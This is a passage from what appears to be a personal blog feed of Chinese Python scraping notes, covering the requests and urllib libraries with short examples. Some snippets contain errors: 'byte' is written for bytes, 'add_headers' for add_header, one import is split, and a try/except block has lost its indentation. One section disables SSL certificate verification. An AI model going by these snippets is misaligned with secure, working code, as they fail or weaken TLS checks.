class="comment">#第二行会输出bytes数据，content()输出bytes数据</span></span><br></pre></td></tr></table></figure><ul><li>下面的代码读取图片，在本地打开一个favicon.ico的文件，wb表示以bytes格式写入。然后将图片的字节流写入文件，该文件打开后就是抓取到的图片。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"https://github.com/favicon.ico"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'favicon.ico'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content)</span><br></pre></td></tr></table></figure><h1 id="2-post请求"><a class="markdownIt-Anchor" href="#2-post请求"></a> 2 POST请求</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'name'</span>: <span class="string">'germey'</span>, <span class="string">'age'</span>: <span class="string">'22'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">"http://httpbin.org/post"</span>, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h1 id="3-响应"><a class="markdownIt-Anchor" href="#3-响应"></a> 3 响应</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://www.jianshu.com'</span>)</span><br><span class="line">print(type(r.status_code), r.status_code)</span><br><span class="line">print(type(r.headers), r.headers)</span><br><span class="line">print(type(r.cookies), r.cookies)</span><br><span class="line">print(type(r.url), r.url)</span><br><span class="line">print(type(r.history), r.history)</span><br></pre></td></tr></table></figure><ul><li>下面的代码中，状态码200可以用<kbd>requests.codes.ok</kbd>来比对；404可以用<kbd>requests.codes.not_found</kbd>来比对等等：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://www.jianshu.com'</span>)</span><br><span class="line">exit() <span class="keyword">if</span> <span class="keyword">not</span> r.status_code == requests.codes.ok <span class="keyword">else</span> print(<span class="string">'Request Successfully'</span>)</span><br></pre></td></tr></table></figure><h1 id="4-高级用法"><a class="markdownIt-Anchor" href="#4-高级用法"></a> 4 高级用法</h1><h2 id="41-文件上传"><a class="markdownIt-Anchor" href="#41-文件上传"></a> 4.1 文件上传</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'favicon.ico'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.post(<span class="string">"http://httpbin.org/post"</span>, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="42-cookies"><a class="markdownIt-Anchor" href="#42-cookies"></a> 4.2 Cookies</h2><ul><li>代码中，items()将字典中的每一对键值转化为元组，返回一个多个元组组成的列表：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">print(r.cookies)</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> r.cookies.items():</span><br><span class="line">    print(key + <span class="string">'='</span> + value)</span><br></pre></td></tr></table></figure><h2 id="43-会话维持"><a class="markdownIt-Anchor" href="#43-会话维持"></a> 4.3 会话维持</h2><ul><li>设想这样一个场景，第一个请求利用post()方法登录了某个网站，第二次想获取成功登录后的自己的个人信息，你又用了一次get()方法去请求个人信息页面。实际上，这相当于打开了两个浏览器，是两个完全不相关的会话，能成功获取个人信息吗？那当然不能。</li><li>利用<kbd>Session</kbd>便可以实现这个功能，维持同一个会话。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置了浏览器的cookie</span></span><br><span class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/number/123456789'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以直接获取到cookie，因为是在同一个会话中</span></span><br><span class="line">r = s.get(<span class="string">'http://httpbin.org/cookies'</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="44-ssl证书验证"><a class="markdownIt-Anchor" href="#44-ssl证书验证"></a> 4.4 SSL证书验证</h2><ul><li>对于证书没有被官方CA机构信任的网站，直接访问会报错；</li><li>把<kbd>verify</kbd>参数设置为<kbd>False</kbd>即可：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.12306.cn'</span>, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure><h2 id="45-代理设置"><a class="markdownIt-Anchor" href="#45-代理设置"></a> 4.5 代理设置</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">"http"</span>: <span class="string">"http://10.10.1.10:3128"</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="string">"http://10.10.1.10:1080"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">"https://www.taobao.com"</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><ul><li>若代理需要使用HTTP Basic Auth，可以使用类似|<code>http://user:password@host:port</code>|这样的语法来设置代理，示例如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://user:password@10.10.1.10:3128/"</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.get(<span class="string">"https://www.taobao.com"</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><ul><li>除了基本的HTTP代理外，requests还支持SOCKS协议的代理。</li><li>首先，需要安装socks这个库：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install &#39;requests[socks]&#39;</span><br></pre></td></tr></table></figure><ul><li>然后就可以使用SOCKS协议代理了，示例如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'socks5://user:password@host:port'</span>,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'socks5://user:password@host:port'</span></span><br><span class="line">&#125;</span><br><span class="line">requests.get(<span class="string">"https://www.taobao.com"</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><h2 id="46-超时设置"><a class="markdownIt-Anchor" href="#46-超时设置"></a> 4.6 超时设置</h2><p>i</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mport requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"https://www.taobao.com"</span>, timeout = <span class="number">1</span>)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure><h2 id="47-身份认证"><a class="markdownIt-Anchor" href="#47-身份认证"></a> 4.7 身份认证</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">r = requests.get(<span class="string">'http://localhost:5000'</span>, auth=(<span class="string">'username'</span>, <span class="string">'password'</span>))</span><br><span class="line">print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#auth=()实际上是调用了 requests.auth.HTTPBasicAuth 库中的 auth=HTTPBasicAuth('username', 'password')</span></span><br></pre></td></tr></table></figure><h2 id="48-prepared-request"><a class="markdownIt-Anchor" href="#48-prepared-request"></a> 4.8 Prepared Request</h2><ul><li>在requests中也可以将请求表示为数据结构，这个数据结构称为Prepared Request</li><li>这里我们引入了Request，然后用url、data和headers参数构造了一个Request对象，这时需要再调用Session的prepare_request()方法将其转换为一个Prepared Request对象，然后调用send()方法发送即可：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'germey'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">'POST'</span>, url, data=data, headers=headers)</span><br><span class="line">prepped = s.prepare_request(req)</span><br><span class="line">r = s.send(prepped)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><ul><li>有了Request这个对象，就可以将请求当作独立的对象来看待，这样在进行队列调度时会非常方便。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3爬虫笔记-urllib</title>
      <link href="/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-urllib/"/>
      <url>/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-urllib/</url>
      
        <content type="html"><![CDATA[<ul><li>urllib库是Python内置的HTTP请求库，不需要额外安装。它包含如下4个模块：<ul><li>request：HTTP请求模块</li><li>error：异常处理模块</li><li>parse：提供URL处理方法，包括拆分、解析、合并等</li><li>robotparser：识别网站等robot.txt文件</li></ul></li></ul><h1 id="1-urllibrequest发送请求"><a class="markdownIt-Anchor" href="#1-urllibrequest发送请求"></a> 1 urllib.request发送请求</h1><ul><li>连接URL，获取返回页面的源代码；默认请求方式为GET</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line"><span class="keyword">print</span> (response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#response是一个HttpResponded对象，其中包含许多方法</span></span><br><span class="line"><span class="keyword">print</span> (type(response)) </span><br><span class="line"><span class="keyword">print</span> (response.getheaders())</span><br><span class="line"><span class="keyword">print</span> (response.getheader(<span class="string">'Server'</span>))</span><br></pre></td></tr></table></figure><ul><li>使用POST方法提交数据使用了data参数之后，请求方式就变成了POST</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#byte()方法将数据转化为字节流，其中第一个参数将字典转化为字符串</span></span><br><span class="line">data = byte(urllib.parse.urlencode(&#123;<span class="string">'word'</span>:<span class="string">'hello'</span>&#125;), encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">response = urllib.request.urlopen(<span class="string">'http://httpbin.org/post'</span>, data=data)</span><br></pre></td></tr></table></figure><ul><li>设定超时时间</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.baidu.com'</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">if</span> isinstance(e.reason, socket.timeout):</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'TIME OUT'</span>)</span><br></pre></td></tr></table></figure><ul><li>Request：使用Request，将请求独立成一个对象，还可以更加丰富灵活的配置参数。<br />此时data参数必须要上传bytes类型。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'httpbin.org'</span></span><br><span class="line">&#125;</span><br><span class="line">dict = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'Germey'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = bytes(parse.urlencode(dict), encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req = urllib.request.Request(url=url, data=data, headers=headers, method=<span class="string">'POST'</span>)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"></span><br><span class="line"><span class="comment">#另外，headers参数也可以用add_headers()方法来添加</span></span><br><span class="line">req = urllib.request.Request(url=url, data=data, method=<span class="string">'POST'</span>)</span><br><span class="line">req.add_headers(<span class="string">'User-Agent'</span> ,<span class="string">'xxxxxxxxxx'</span>)</span><br></pre></td></tr></table></figure><h2 id="11-urllibrequest高级用法"><a class="markdownIt-Anchor" href="#11-urllibrequest高级用法"></a> 1.1 urllib.request高级用法</h2><ul><li>利用Handler来创建Opener</li></ul><h3 id="111-验证"><a class="markdownIt-Anchor" href="#111-验证"></a> 1.1.1 验证</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> HTTPPasswordMgrWithDefaultRealm, HTTPBasicAuthHandler, build_opener</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line">username = <span class="string">'username'</span></span><br><span class="line">password = <span class="string">'password'</span></span><br><span class="line">url = <span class="string">'http://localhost:5000/'</span></span><br><span class="line"></span><br><span class="line">p = HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">p.add_password(<span class="literal">None</span>, url, username, password)</span><br><span class="line">auth_handler = HTTPBasicAuthHandler(p)</span><br><span class="line">opener = build_opener(auth_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = opener.open(url)</span><br><span class="line">    html = result.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(html)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><h3 id="112-代理"><a class="markdownIt-Anchor" href="#112-代理"></a> 1.1.2 代理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:9743'</span>,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'https://127.0.0.1:9743'</span></span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><h3 id="113-cookies"><a class="markdownIt-Anchor" href="#113-cookies"></a> 1.1.3 Cookies</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar, urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意，获取到的cookie存储在CookieJar对象中</span></span><br><span class="line">cookie = http.cookiejar.CookieJar()</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">response = opener.open(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cookie:</span><br><span class="line">    print(item.name+ <span class="string">"="</span> +item.value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie以MozillaCookieJar格式保存在文本文档中</span></span><br><span class="line">filename = <span class="string">'cookies.txt'</span></span><br><span class="line">cookie = http.cookiejar.MozillaCookieJar(filename)</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">response = opener.open(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#从文本文档中读取LWPCookieJar格式的cookie</span></span><br><span class="line">cookie = http.cookiejar.LWPCookieJar()</span><br><span class="line">cookie.load(<span class="string">'cookies.txt'</span>, ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">response = opener.open(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><h1 id="2-urlliberror处理异常"><a class="markdownIt-Anchor" href="#2-urlliberror处理异常"></a> 2 urllib.error处理异常</h1><p>urllib的<kbd>error</kbd>模块定义了由<kbd>request</kbd>模块产生的异常。如果出现了问题，<kbd>request</kbd>模块便会抛出<kbd>error</kbd>模块中定义的异常。</p><h2 id="21-urlerror"><a class="markdownIt-Anchor" href="#21-urlerror"></a> 2.1 URLError</h2><p>由request模块生的异常都可以通过捕获这个类来处理。它具有一个属性reason，即返回错误的原因。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'http://cuiqingcai.com/index.htm'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><h2 id="22-httperror"><a class="markdownIt-Anchor" href="#22-httperror"></a> 2.2 HTTPError</h2><p>它是URLError的子类，专门用来处理HTTP请求错误，比如认证请求失败等。它有如下3个属性:</p><ul><li><kbd>code</kbd>：返回HTTP状态码，比如404表示网页不存在，500表示服务器内部错误等。</li><li><kbd>reason</kbd>：同父类一样，用于返回错误的原因。</li><li><kbd>headers</kbd>：返回请求头。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'http://cuiqingcai.com/index.htm'</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason, e.code, e.headers, sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>因为URLError是HTTPError的父类，所以可以先选择捕获子类的错误，再去捕获父类的错误，所以上述代码更好的写法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'http://cuiqingcai.com/index.htm'</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason, e.code, e.headers, sep=<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'Request Successfully'</span>)</span><br></pre></td></tr></table></figure><h1 id="3-urllibparse解析链接"><a class="markdownIt-Anchor" href="#3-urllibparse解析链接"></a> 3 urllib.parse解析链接</h1><h2 id="31-urlparse"><a class="markdownIt-Anchor" href="#31-urlparse"></a> 3.1 urlparse()</h2><ul><li>该方法可以实现URL的识别和分段：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"> </span><br><span class="line">result = urlparse(<span class="string">'http://www.baidu.com/index.html;user?id=5#comment'</span>)</span><br><span class="line">print(type(result), result)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">urllib</span>.<span class="title">parse</span>.<span class="title">ParseResult</span>'&gt;</span></span><br><span class="line"><span class="class"><span class="title">ParseResult</span><span class="params">(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.html'</span>, params=<span class="string">'user'</span>, query=<span class="string">'id=5'</span>, fragment=<span class="string">'comment'</span>)</span></span></span><br></pre></td></tr></table></figure><ul><li>urlparse()的API用法：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urllib.parse.urlparse(urlstring, scheme=<span class="string">''</span>, allow_fragments=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><kbd>urlstring</kbd>：这是必填项，即待解析的URL。</p><p><kbd>scheme</kbd>：它是默认的协议（比如http或https等）。假如这个链接没有带协议信息，会将这个作为默认的协议；假如链接带有协议信息，则这个参数不能更改原链接的协议。</p><p><kbd>allow_fragments</kbd>：即是否忽略fragment。如果它被设置为False，fragment部分就会被忽略，它会被解析为path、parameters或者query的一部分，而fragment部分为空。</p><ul><li>返回结果ParseResult实际上是一个元组，我们可以用索引顺序来获取，也可以用属性名获取：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"> </span><br><span class="line">result = urlparse(<span class="string">'http://www.baidu.com/index.html#comment'</span>, allow_fragments=<span class="literal">False</span>)</span><br><span class="line">print(result.scheme, result[<span class="number">0</span>], result.netloc, result[<span class="number">1</span>], sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><h2 id="32-urlunparse"><a class="markdownIt-Anchor" href="#32-urlunparse"></a> 3.2 urlunparse()</h2><ul><li>urlunparse()接受的参数是一个可迭代对象，但是它的长度必须是6，否则会抛出参数数量不足或者过多的问题</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunparse</span><br><span class="line"> </span><br><span class="line">data = [<span class="string">'http'</span>, <span class="string">'www.baidu.com'</span>, <span class="string">'index.html'</span>, <span class="string">'user'</span>, <span class="string">'a=6'</span>, <span class="string">'comment'</span>]</span><br><span class="line">print(urlunparse(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">http://www.baidu.com/index.html;user?a=6#comment</span><br></pre></td></tr></table></figure><h2 id="33-urlsplit"><a class="markdownIt-Anchor" href="#33-urlsplit"></a> 3.3 urlsplit()</h2><ul><li>这个方法和urlparse()方法非常相似，只不过它不再单独解析params这一部分，只返回5个结果。上面例子中的params会合并到path中。</li><li>返回结果是SplitResult，它其实也是一个元组类型，既可以用属性获取值，也可以用索引来获取。</li></ul><h2 id="34-urlunsplit"><a class="markdownIt-Anchor" href="#34-urlunsplit"></a> 3.4 urlunsplit()</h2><ul><li>与urlunparse()类似，它也是将链接各个部分组合成完整链接的方法，传入的参数也是一个可迭代对象，例如列表、元组等，唯一的区别是长度必须为5。</li></ul><h2 id="35-urljoin"><a class="markdownIt-Anchor" href="#35-urljoin"></a> 3.5 urljoin()</h2><ul><li>我们可以提供一个base_url（基础链接）作为第一个参数，将新的链接作为第二个参数，该方法会分析base_url的scheme、netloc和path这3个内容并对新链接缺失的部分进行补充，最后返回结果。</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com'</span>, <span class="string">'FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com'</span>, <span class="string">'https://cuiqingcai.com/FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com/about.html'</span>, <span class="string">'https://cuiqingcai.com/FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com/about.html'</span>, <span class="string">'https://cuiqingcai.com/FAQ.html?question=2'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com?wd=abc'</span>, <span class="string">'https://cuiqingcai.com/index.php'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com'</span>, <span class="string">'?category=2#comment'</span>))</span><br><span class="line">print(urljoin(<span class="string">'www.baidu.com'</span>, <span class="string">'?category=2#comment'</span>))</span><br><span class="line">print(urljoin(<span class="string">'www.baidu.com#comment'</span>, <span class="string">'?category=2'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">http://www.baidu.com/FAQ.html</span><br><span class="line">https://cuiqingcai.com/FAQ.html</span><br><span class="line">https://cuiqingcai.com/FAQ.html</span><br><span class="line">https://cuiqingcai.com/FAQ.html?question=2</span><br><span class="line">https://cuiqingcai.com/index.php</span><br><span class="line">http://www.baidu.com?category=2#comment</span><br><span class="line">www.baidu.com?category=2#comment</span><br><span class="line">www.baidu.com?category=2</span><br></pre></td></tr></table></figure><p>可以发现，base_url提供了三项内容scheme、netloc和path。如果这3项在新的链接里不存在，就予以补充；如果新的链接存在，就使用新的链接的部分。而base_url中的params、query和fragment是不起作用的。</p><h2 id="36-urlencode"><a class="markdownIt-Anchor" href="#36-urlencode"></a> 3.6 urlencode()</h2><p>urlencode()在构造GET请求参数的时候非常有用</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'germey'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">base_url = <span class="string">'http://www.baidu.com?'</span></span><br><span class="line">url = base_url + urlencode(params)</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">http://www.baidu.com?name=germey&amp;age=22</span><br></pre></td></tr></table></figure><h2 id="37-parse_qs"><a class="markdownIt-Anchor" href="#37-parse_qs"></a> 3.7 parse_qs()</h2><p>有了序列化，必然就有反序列化。如果我们有一串GET请求参数，利用parse_qs()方法，就可以将它转回字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line"> </span><br><span class="line">query = <span class="string">'name=germey&amp;age=22'</span></span><br><span class="line">print(parse_qs(query))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="string">'name'</span>: [<span class="string">'germey'</span>], <span class="string">'age'</span>: [<span class="string">'22'</span>]&#125;</span><br></pre></td></tr></table></figure><h2 id="38-parse_qsl"><a class="markdownIt-Anchor" href="#38-parse_qsl"></a> 3.8 parse_qsl()</h2><p>用于将参数转化为元组组成的列表：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qsl</span><br><span class="line"> </span><br><span class="line">query = <span class="string">'name=germey&amp;age=22'</span></span><br><span class="line">print(parse_qsl(query))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[(<span class="string">'name'</span>, <span class="string">'germey'</span>), (<span class="string">'age'</span>, <span class="string">'22'</span>)]</span><br></pre></td></tr></table></figure><h2 id="39-quote"><a class="markdownIt-Anchor" href="#39-quote"></a> 3.9 quote()</h2><ul><li>将内容转化为URL编码的格式。URL中带有中文参数时，有时可能会导致乱码的问题，此时用这个方法可以将中文字符转化为URL编码:</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"> </span><br><span class="line">keyword = <span class="string">'壁纸'</span></span><br><span class="line">url = <span class="string">'https://www.baidu.com/s?wd='</span> + quote(keyword)</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">https://www.baidu.com/s?wd=%E5%A3%81%E7%BA%B8</span><br></pre></td></tr></table></figure><h2 id="310-unquote"><a class="markdownIt-Anchor" href="#310-unquote"></a> 3.10 unquote()</h2><ul><li>进行URL解码</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"> </span><br><span class="line">url = <span class="string">'https://www.baidu.com/s?wd=%E5%A3%81%E7%BA%B8'</span></span><br><span class="line">print(unquote(url))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">https://www.baidu.com/s?wd=壁纸</span><br></pre></td></tr></table></figure><h1 id="4-urllibrobotparser分析robots协议"><a class="markdownIt-Anchor" href="#4-urllibrobotparser分析robots协议"></a> 4 urllib.robotparser分析Robots协议</h1><ul><li><p>Robots协议也称作爬虫协议、机器人协议，它的全名叫作网络爬虫排除标准（Robots Exclusion 